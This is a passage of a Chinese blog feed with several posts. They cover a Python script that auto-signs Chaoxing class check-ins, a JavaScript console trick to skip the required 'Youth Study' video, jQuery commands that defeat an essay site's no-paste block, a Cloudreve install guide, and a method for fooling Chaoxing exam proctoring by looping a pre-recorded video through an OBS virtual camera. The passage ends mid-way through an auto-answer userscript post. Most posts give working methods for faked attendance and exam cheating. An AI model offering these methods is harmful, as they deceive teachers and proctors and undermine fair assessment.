class="hljs-number">0</span>]) <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> parse_qs(url_query).items()])<br>    <span class="hljs-keyword">global</span> courseId, classId<br>    courseId = userdata[<span class="hljs-string">&quot;courseId&quot;</span>]<br>    classId = userdata[<span class="hljs-string">&quot;clazzid&quot;</span>]<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>():</span><br>    getuserdata()<br>    <span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>        url = <span class="hljs-string">f&#x27;https://mobilelearn.chaoxing.com/ppt/activeAPI/taskactivelist?courseId=&#x27;</span>+courseId+<span class="hljs-string">&#x27;&amp;classId=&#x27;</span>+classId+<span class="hljs-string">&#x27;&amp;uid=&#x27;</span>+<span class="hljs-built_in">str</span>(uid)<br>        web = s.get(url,verify=<span class="hljs-literal">False</span>)<br>        activeList = json.loads(web.text)[<span class="hljs-string">&quot;activeList&quot;</span>]<br>        <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> activeList:<br>            <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;nameTwo&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> item):<br>                <span class="hljs-keyword">continue</span><br>            <span class="hljs-keyword">if</span> (item[<span class="hljs-string">&#x27;activeType&#x27;</span>] == <span class="hljs-number">2</span> <span class="hljs-keyword">and</span> item[<span class="hljs-string">&#x27;status&#x27;</span>] == <span class="hljs-number">1</span>):<br>                signurl = item[<span class="hljs-string">&#x27;url&#x27;</span>]<br>                var = signurl.split(<span class="hljs-string">&quot;&amp;&quot;</span>)<br>                <span class="hljs-keyword">for</span> var1 <span class="hljs-keyword">in</span> var:<br>                    var2 = var1.split(<span class="hljs-string">&quot;=&quot;</span>)<br>                    <span class="hljs-keyword">if</span>(var2[<span class="hljs-number">0</span>] == <span class="hljs-string">&quot;activePrimaryId&quot;</span>):<br>                        aid = var2[<span class="hljs-number">1</span>]<br>                <span class="hljs-keyword">if</span> (aid <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> activates):<br>                    print(<span class="hljs-string">&quot;查询到签到 名称:%s 活动时间:%s aid:%s&quot;</span> % (<br>                        item[<span class="hljs-string">&#x27;nameOne&#x27;</span>], item[<span class="hljs-string">&#x27;nameFour&#x27;</span>], aid))<br>                    sign(aid, uid)<br>            <span class="hljs-keyword">else</span>:<br>                time.sleep(<span class="hljs-number">3</span>)<br>                print(<span class="hljs-string">&quot;签到暂未开通&quot;</span>)    <br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    print(<span class="hljs-string">&quot;登录成功后等待签到开始&quot;</span>)<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-comment">#captchalogin(username,password)</span><br>        login()<br>        main()<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        print(<span class="hljs-string">&#x27;repr(e):&#x27;</span>, <span class="hljs-built_in">repr</span>(e))<br>   <br></code></pre></td></tr></table></figure><h1 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h1><p>1.需要手机号登录，无fid信息无法使用院校学号登录<br>2.如果需要使用学号登录，自己或许院校fid信息，并修改代码中的fid信息<br>3.如果首次登录提示错误，关闭程序再打开试试<br>4.如果抓不到课程信息什么的，可能需要自己查询html自己修改xpath</p><h1 id="帮助"><a href="#帮助" class="headerlink" title="帮助"></a>帮助</h1><p><a href="https://github.com/mengshouer/mooc_tools">https://github.com/mengshouer/mooc_tools</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>通过JS跳过青年大学习的实现原理</title>
    <link href="/2020/06/46.html"/>
    <url>/2020/06/46.html</url>
    
    <content type="html"><![CDATA[<blockquote><p>富强、民主、文明、和谐，自由、平等、公正、法治， 爱国、敬业、诚信、友善。<br>富强、民主、文明、和谐，自由、平等、公正、法治， 爱国、敬业、诚信、友善。<br>富强、民主、文明、和谐，自由、平等、公正、法治， 爱国、敬业、诚信、友善。<br>爱我中华！！！！！！！！！！！！！！！！！</p></blockquote><a id="more"></a><hr><p><strong>青年大学习还是很有意义的，一定要自觉哦，这方法是为了那些真的有bug看了好几遍都失败的同学准备的，不要用来直接跳过完成任务</strong><br><strong>本教程只是技术交流，禁止谋取不正当利益</strong></p><hr><h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>1.当点击“开始学习”，客户端和服务器之间的请求是这样子的：</p><p><img src="https://ae01.alicdn.com/kf/H6cd151b4bc184600a58c7029e7fc4a59d.jpg" srcset="/img/loading.gif" lazyload alt="1"></p><p>从这里可以看出，当开始看视频的时候，服务器发送了一个 xxx.mp4 的视频过来，这个就是我们要看的视频啦。然后神奇的事情发生了：<br><strong>直到看完，客户端都没有再返回数据到服务器</strong></p><p>这说明了：<br>当提交表单（填写个人信息）的那一刻，页面进行跳转的时候，服务器就已经接受到你在看视频的请求了，所以<strong>后台是不知道你看没看完的，当点击提交那一刻，你就已经被标记为看完了。</strong></p><p>2.后台记录是有了，可是截图呢？这里说说基于JavaScript来进行跳过视频的例子：</p><ul><li>主角1：getElementById() 方法</li><li><code>document.getElementById(id)</code></li></ul><blockquote><p>定义和用法：getElementById() 方法可返回对拥有指定 ID 的第一个对象的引用</p></blockquote><ul><li>主角2：currentTime 属性<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs abnf">//将时间位置设置为 <span class="hljs-number">5</span> 秒：<br><span class="hljs-attribute">myVid</span>=document.getElementById(<span class="hljs-string">&quot;video1&quot;</span>)<span class="hljs-comment">;</span><br>myVid.currentTime=<span class="hljs-number">5</span><span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><blockquote><p>定义和用法:currentTime 属性设置或返回音频/视频播放的当前位置（以秒计）。当设置该属性时，播放会跳跃到指定的位置。</p></blockquote></li></ul><p><strong>那么原理就很简单了，利用getElementById()获取到对应的视频对象，然后再设置currentTime实现定位视频位置（也就是拉进度条），就可以光速播放完了。</strong></p><p>3.确认后台记录了，也知道跳过视频的原理了，可是微信内置浏览器可不能调试啊？别急这里说最后一个原理——<em>给你的微信开启X5内核</em><br>什么是x5内核，官方的解释是这样子的：</p><blockquote><p>X5内核是腾讯基于优秀开源Webkit深度优化的浏览器渲染引擎，搭载在最新一代的手机QQ浏览器上，更快，更便捷。</p></blockquote><p>但是我们不管他，只要知道在这里，x5内核就是让你的微信浏览页面的时候，可以进行调试如在电脑上按f12一样的效果。<br>为什么要调试嘞？当然是为了运行命令啊！！</p><h1 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h1><ul><li><p>Step1 给你的微信装上X5内核</p></li><li><p>首先复制以下链接（放心，是腾讯提供的），发送到任意一个微信聊天界面，推荐文件传输服务就行，你要发好友也不是不可以。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">依次访问（看图）：<br>第一 debugmm.qq.com/?forcex5=true <br>第二 http:<span class="hljs-regexp">//</span>debugtbs.qq.com <br>第三 http:<span class="hljs-regexp">//</span>debugx5.qq.com<br></code></pre></td></tr></table></figure><p><img src="https://ae01.alicdn.com/kf/Hc182888057e647d0b2e3f14920a829dcS.jpg" srcset="/img/loading.gif" lazyload alt="2"></p></li><li><p>点击第一个链接，会提示<code>force use x5 switch is on</code> ，然后关掉</p></li><li><p>点击第二个链接，会开始下载x5内核，下载完成后会进入调试页面，长这样子：</p><p><img src="https://ae01.alicdn.com/kf/H002a25b73c9347c1b1f0e1ec6c5232d74.jpg" srcset="/img/loading.gif" lazyload alt="3"></p></li><li><p>关掉调试页面，点击第三个链接进入X5调试页面，在信息页里点击开启vConsole调试功能，这个功能的作用就是可以让你的页面中进行调试代码，如下图：</p><p><img src="https://ae01.alicdn.com/kf/Hb3ad3598d3894f1eaf35acb91e2c5ad1x.jpg" srcset="/img/loading.gif" lazyload alt="4"></p></li><li><p>Step2 执行代码</p></li><li><p>复制以下代码</p></li><li><p><code>document.getElementById(&#39;Bvideo&#39;).currentTime=300;</code></p></li><li><p>打开青年大学习的网页，填写好信息后点击开始学习，在视频播放的时候，点击左下角绿色的vConsole</p><p><img src="https://ae01.alicdn.com/kf/H081646f8dbd84a7098b555e709180430y.jpg" srcset="/img/loading.gif" lazyload alt="5"></p></li><li><p>在打开的控制台中输入刚刚的代码，点击OK。</p><p><img src="https://ae01.alicdn.com/kf/H050214992f374e6a9499fc06139c8281N.jpg" srcset="/img/loading.gif" lazyload alt="6"></p></li><li><p>完成，你学废了嘛？</p></li></ul><h1 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h1><p>1.如果不想答题把<code>document.getElementById(&#39;Bvideo&#39;).currentTime=300;</code>中的<code>300</code>这个数字往上调，不用担心系统检测部检测啥的，服务器只在提交信息表时有上传，也就是你的答案的正确与否，只有你自己知道。</p><p>2.点完三个连接后以后跳时不需要再填，只需要直接开始学习然后在控制台跳过就行啦。</p><p><strong>声明：</strong>上述方法没有任何不良危害，这都是在遵循这些网页框架下的操作，系统是和你正常完成一样的。本人也在用这个方法。<br><strong>当然：</strong>如果上面的方法用了还是觉得不够方便或者说没能实现，可以直接在手机的任务栏界面开启自动旋转，直接拉进度条，这个不管是安卓还是苹果都是可以的只不过方式不同。</p>]]></content>
    
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>批改网解决“禁止粘贴”的几种方法</title>
    <link href="/2020/05/45.html"/>
    <url>/2020/05/45.html</url>
    
    <content type="html"><![CDATA[<blockquote><p>今天上午考完试就沉浸在了过！的喜悦中，但是下午打开手机的备忘录却发现还有一篇作文还没写，在批改网上，慌啊，要到截止时间了！！！！<br>问题不大，还好有她。嗯…就当我拿到写完的作文后去打开批改网提交的时候，出现了下面这个令人不开心的弹窗。<br><img src="https://ae01.alicdn.com/kf/H62965929a3314526a506ec7d35a4a21f4.jpg" srcset="/img/loading.gif" lazyload alt="1"></p></blockquote><p>啊！！！！！！！！！！！！难道让我手敲吗？不可能，这辈子都不可能！怎么办呢？安排他。</p><h1 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h1><p>移除监听事件即可开启<br>在浏览器中打开，鼠标右键选择检查，或者按快捷键F12打开调试窗口<br>点击Console<br><img src="https://ae01.alicdn.com/kf/H890408c25c104ddeacf94b8688f092b7p.jpg" srcset="/img/loading.gif" lazyload alt="2"><br>输入以下代码：<br><code>$(&#39;#contents&#39;).unbind();</code><br>然后回车就可以复制粘贴啦！<br><img src="https://ae01.alicdn.com/kf/H10e4c55695774063b8590a83395a42f4W.jpg" srcset="/img/loading.gif" lazyload alt="3"></p><h1 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h1><p>这种方法长期有效，除非作文批改网修改了标签的名字（这时候只需要修改相应的名字就好啦），增加一个可以粘贴的对话框，还是重复上面的步骤，在控制台（Console）输入一下代码：<br><code>$(&quot;#titleW&quot;).append(&#39;&lt;textarea id=&quot;rslyycm&quot; rows=&quot;100&quot; cols=&quot;50&quot;&gt;&lt;/textarea&gt;&#39;);</code><br>回车执行完之后会出现一个输入框，可以调整大小的输入框，将文章粘贴进去就好，然后执行下面的代码：<br><code>$(&quot;#contents&quot;).val($(&quot;#rslyycm&quot;).val());</code><br>按回车执行这样就ok啦！</p>]]></content>
    
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>超简单个人网盘搭建教程，宝塔面板安装Cloudreve新版V3(Go版本)</title>
    <link href="/2020/05/44.html"/>
    <url>/2020/05/44.html</url>
    
    <content type="html"><![CDATA[<blockquote><p>最近百度网盘方面政策开始收缩，很多朋友怨声载道，当是时，Cloudreve 的作者肝了六个月更新发布了v3版本，用 Go 语言重构了一遍，除了修复 V2 版本被诟病很多的 Bug 外，还增加了很多令人兴奋的新特性，关键是免费用呀，朋友们。</p></blockquote><h1 id="Cloudreve-新版V3特性"><a href="#Cloudreve-新版V3特性" class="headerlink" title="Cloudreve 新版V3特性"></a>Cloudreve 新版V3特性</h1><ul><li>☁️ 支持本机、从机、七牛、阿里云 OSS、腾讯云 COS、又拍云、OneDrive (包括世纪互联版) 作为存储端</li><li>📤 上传/下载 支持客户端直传，支持下载限速</li><li>💾 可对接 Aria2 离线下载</li><li>📚 在线 压缩/解压缩、多文件打包下载</li><li>💻 覆盖全部存储策略的 WebDAV 协议支持</li><li>⚡ 拖拽上传、目录上传、流式上传处理</li><li>🗃️ 文件拖拽管理</li><li>👩‍👧‍👦 多用户、用户组</li><li>🔗 创建文件、目录的分享链接，可设定自动过期</li><li>👁️‍🗨️ 视频、图像、音频、文本、Office 文档在线预览</li><li>🎨 自定义配色、黑暗模式、PWA 应用、全站单页应用</li><li>🚀 All-In-One 打包，开箱即用</li><li>🌈 … …</li></ul><h1 id="官方支持的网站和文档"><a href="#官方支持的网站和文档" class="headerlink" title="官方支持的网站和文档"></a>官方支持的网站和文档</h1><ul><li>官网：<a href="https://cloudreve.org/">https://cloudreve.org/</a></li><li>github：<a href="https://github.com/cloudreve/Cloudreve">https://github.com/cloudreve/Cloudreve</a></li><li>下载：<a href="https://github.com/cloudreve/Cloudreve/releases">https://github.com/cloudreve/Cloudreve/releases</a></li><li>安装文档：<a href="https://docs.cloudreve.org/getting-started/install">https://docs.cloudreve.org/getting-started/install</a></li><li>演示：<a href="https://demo.cloudreve.org/">https://demo.cloudreve.org</a></li></ul><h1 id="宝塔命令行输入代码查询内核参数"><a href="#宝塔命令行输入代码查询内核参数" class="headerlink" title="宝塔命令行输入代码查询内核参数"></a>宝塔命令行输入代码查询内核参数</h1><ul><li><code>arch</code><br><img src="https://ae01.alicdn.com/kf/Haf1c3433d781486c8da75d21b5ea9fa6T.jpg" srcset="/img/loading.gif" lazyload alt="1"><br>输出结果x86_64代表amd64；aarch64代表arm64</li></ul><h1 id="下载链接处找到对应的版本-复制链接地址"><a href="#下载链接处找到对应的版本-复制链接地址" class="headerlink" title="下载链接处找到对应的版本,复制链接地址"></a>下载链接处找到对应的版本,复制链接地址</h1><p><img src="https://ae01.alicdn.com/kf/H42c61ebfaed846fd95dc9c0fe2b419caF.jpg" srcset="/img/loading.gif" lazyload alt="2"></p><h1 id="宝塔安全添加5212端口"><a href="#宝塔安全添加5212端口" class="headerlink" title="宝塔安全添加5212端口"></a>宝塔安全添加5212端口</h1><p><img src="https://ae01.alicdn.com/kf/H2346f47d81424c788ca82982125e3708N.jpg" srcset="/img/loading.gif" lazyload alt="3"></p><h1 id="宝塔命令行逐行执行以下命令，对应链接处改为自己复制的："><a href="#宝塔命令行逐行执行以下命令，对应链接处改为自己复制的：" class="headerlink" title="宝塔命令行逐行执行以下命令，对应链接处改为自己复制的："></a>宝塔命令行逐行执行以下命令，对应链接处改为自己复制的：</h1><p><em>（当然你也可以把下边的改成自己的然后全部复制黏贴就完事了）</em></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs awk">mkdir <span class="hljs-regexp">/www/</span>wwwroot/cloudreve <span class="hljs-comment"># 新建一个文件夹存放程序</span><br>cd <span class="hljs-regexp">/www/</span>wwwroot/cloudreve <span class="hljs-comment"># 进入该文件夹</span><br>wget https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/cloudreve/</span>Cloudreve<span class="hljs-regexp">/releases/</span>download<span class="hljs-regexp">/3.0.0/</span>cloudreve_3.<span class="hljs-number">0.0</span>_linux_amd64.tar.gz <span class="hljs-comment"># 下载你复制的链接</span><br>tar -zxvf cloudreve_3.<span class="hljs-number">0.0</span>_linux_amd64.tar.gz <span class="hljs-comment"># 解压获取到的主程序</span><br>chmod +x ./cloudreve <span class="hljs-comment"># 赋予执行权限</span><br>./cloudreve <span class="hljs-comment"># 启动 Cloudreve</span><br></code></pre></td></tr></table></figure><h1 id="安装完成，保存账户和登录密码，务必保存该密码，测试登录"><a href="#安装完成，保存账户和登录密码，务必保存该密码，测试登录" class="headerlink" title="安装完成，保存账户和登录密码，务必保存该密码，测试登录"></a>安装完成，保存账户和登录密码，务必保存该密码，测试登录</h1><p>登录地址为服务器ip:5212，比如<a href="http://123.57.35.68:5212/">http://123.57.35.68:5212/</a><br><img src="https://ae01.alicdn.com/kf/Hcdea7884bb1e48fa9809e367f91cea253.jpg" srcset="/img/loading.gif" lazyload alt="4"></p><h1 id="原文链接（拓展设置）"><a href="#原文链接（拓展设置）" class="headerlink" title="原文链接（拓展设置）"></a>原文链接（拓展设置）</h1><p><a href="https://www.dhzy.fun/archives/1811.html">https://www.dhzy.fun/archives/1811.html</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>Linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>基于OBS虚拟摄像头欺骗超星考试系统的原理与实现</title>
    <link href="/2020/05/43.html"/>
    <url>/2020/05/43.html</url>
    
    <content type="html"><![CDATA[<blockquote><p>因为疫情的原因吧，这个学期开学是不存在的了，我们直接迎接考试吧！！！<br>这几天浏览网页的时候发现了这个消息–超星要出考试系统了，看着很厉害的样子。</p></blockquote><p>我们先到知乎这个帖子看看怎么回事然后加入讨论，讨论讨论这个几个大神提出的问题：<br><em>帖子链接<a href="https://www.zhihu.com/question/394116356">https://www.zhihu.com/question/394116356</a></em></p><ul><li>全国那么多人同时考试，超星的服务器崩溃怎么办？</li><li>那么多学生考试，有学生家里断电、断网、网络不稳定而自动交卷怎么办？</li><li>监控开麦克风吗？如果不开，有人监控电脑屏幕，在学生旁边念答案作弊怎么办？</li><li>家里熊孩子拔掉WIFI网线后系统自动交卷怎么办怎么办？学生是不是很冤，因此导致学生挂科，会不会导致学生暴打家里熊孩子，甚至引发家暴和刑事案件？</li></ul><p>个人感觉，这最后一个问题很是值得思考啊!!!!</p><p><strong>在此声明下，以下内容来源于网络，博主只是农夫山泉的搬运工（毕竟自己也是需要的嘛）</strong></p><h1 id="前言（废话）"><a href="#前言（废话）" class="headerlink" title="前言（废话）"></a>前言（废话）</h1><p>听闻超星更新智慧考试系统，一时间学生群体舆论哗然，超星那几张来源不明真假难辨的截图属实吓到了不少的后浪们，社交平台纷纷转发和中国青年报、共青团中央等团学媒体报道引发了一场现象级的大讨论。这一切的背后是人性的险恶还是道德的沦丧我们不得而知，然而等不及超星智慧考试系统正式官宣上线，各路网友已经开始了探索解决方案——只要思想不滑坡，方法总比困难多！</p><h1 id="原理与实现（1-0版本）"><a href="#原理与实现（1-0版本）" class="headerlink" title="原理与实现（1.0版本）"></a>原理与实现（1.0版本）</h1><p>首先我们基于网络上流传的几张超星智慧考试系统的图片来研究他是如何监控我们监考的。面对的几张不到2MB的图片，我翻来翻去一看这图片没有详细内容，歪歪斜斜的每个控件都写着人脸识别，动态监考的这八个字，我横竖睡不着，仔细看了半夜才从字缝里看出字来，满图片都写着八个字是”端正考风，严肃考纪！”作为新世纪的新新人类，没有长辈比我们更了解电子产品。我们都玩过与别人视频通话的把戏，录视频，拍照将自己的盛世美颜转达另一头使用电子产品的知己，而这一切的背后，我们都离不开一个东西，叫做色相头。色像头——罪恶根源的源头。</p><p>超星不是喜欢看脸吗？好，我们就如愿以偿给他一个“自己的脸”。所有的实时视频监控都仰赖于摄像头硬件设备的输入，改变一个视频输入源，利用obs studio软件建立一个虚拟的摄像头作为超星考试平台的视频输入源，对软件进行简单地调试和设置。提前录制好一个几十秒的考试姿势的视频，表情和动作完全模拟考试时的状态且符合超星智慧考试系统动态监控要求，然后循环播放！！！在考试过程中，超星将一直看到这样端正考试的我们。由于目前超星智慧考试系统还没推出，对声音是否有要求还不知道，声音输入源要么禁用，要么给它一个超星想要的声音，超星要什么，我们给什么，满足超星的一切“合理”的诉求。最后，考试加油！！！</p><h1 id="相关信息"><a href="#相关信息" class="headerlink" title="相关信息"></a>相关信息</h1><p>原文地址<a href="https://shimo.im/docs/8tdRgR38dqhjD6yr/read">https://shimo.im/docs/8tdRgR38dqhjD6yr/read</a><br>OBS下载地址<a href="https://obsproject.com/">https://obsproject.com/</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>daily</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>超星学习通自动答题脚本</title>
    <link href="/2020/05/42.html"/>
    <url>/2020/05/42.html</url>
    
    <content type="html"><![CDATA[<blockquote><p>超星学习通助手自作者宣布停止维护后，我就慌了，还有好多课没看呢。心情沉闷，内心焦急，不知道该怎么办，不过恰巧我的手中还有几台母鸡没用，那就不妨自己整个题库吧。经过了一个星期的搭建与维护，目前来说，可以满足自己的日常所需了。今天就分享出来，拯救下大家。</p></blockquote><h1 id="脚本主要功能"><a href="#脚本主要功能" class="headerlink" title="脚本主要功能"></a>脚本主要功能</h1><p>自动挂机看尔雅MOOC，支持视频、音频、文档、图书自动完成，章节测验自动答题提交，支持自动切换任务点、挂机阅读时长、自动登录等，解除各类功能限制，开放自定义参数</p><h1 id="脚本代码（原作者wyn-我只是修改了题库接口）"><a href="#脚本代码（原作者wyn-我只是修改了题库接口）" class="headerlink" title="脚本代码（原作者wyn,我只是修改了题库接口）"></a>脚本代码（原作者wyn,我只是修改了题库接口）</h1><ul><li>油猴链接<a href="https://greasyfork.org/zh-CN/scripts/402536">https://greasyfork.org/zh-CN/scripts/402536</a></li><li>源代码<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span 